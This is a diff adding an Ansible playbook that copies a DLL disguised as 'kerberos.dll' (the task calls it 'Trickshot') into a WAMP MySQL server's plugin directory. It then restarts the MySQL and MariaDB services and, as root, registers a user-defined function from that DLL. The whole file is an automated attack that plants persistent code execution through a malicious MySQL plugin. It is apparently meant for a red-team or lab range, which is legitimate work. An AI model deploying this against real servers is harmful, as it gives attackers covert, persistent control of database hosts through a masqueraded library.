@@ -1,0 +1,22 @@
+---
+
+
+- name: Place Trickshot in MySQL Server Plugin Directory 
+  ansible.windows.win_copy:
+    src: files/kerberos.dll
+    dest: C:\wamp64\bin\mysql\mysql5.7.36\lib\plugin\
+
+- name: Restart MySQL Service
+  win_service: 
+    name: wampmysqld64
+    state: restarted
+
+- name: Restart MariaDB Service 
+  win_service: 
+    name: wampmariadb64
+    state: restarted
+
+- name: Remote into MySQL Server and Run Query 
+  ansible.windows.win_shell: .\mysql.exe -u root -e "CREATE FUNCTION trickshot RETURNS STRING SONAME 'kerberos.dll'"
+  args: 
+    chdir: C:\wamp64\bin\mysql\mysql5.7.36\bin
